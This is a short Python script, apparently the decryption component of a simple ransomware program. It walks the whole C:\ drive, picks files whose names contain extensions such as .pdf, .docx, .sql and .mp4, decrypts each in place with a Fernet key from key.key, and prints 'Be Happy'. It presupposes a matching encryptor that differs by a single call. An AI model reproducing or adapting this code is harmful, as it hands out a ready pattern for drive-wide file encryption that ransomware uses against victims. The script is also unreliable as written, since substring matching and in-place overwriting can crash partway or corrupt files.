import os
from cryptography.fernet import Fernet

ext = ['.pdf','.doc','.xlsx','.mp4','.docx','.mp3','.sql','.csv','.mkv','.pptx']

with open("key.key",'rb') as theKey:
    key = theKey.read()

for i in ext:
    for r, d, f in os.walk("C:\\"):
        for file in f:
            filepath = os.path.join(r, file)
            if i in file:
                with open(filepath,"rb") as fl:
                    data = fl.read()
                decryptData = Fernet(key).decrypt(data)
                with open(filepath,"wb") as fl:
                    
                    fl.write(decryptData)

print("Be Happy")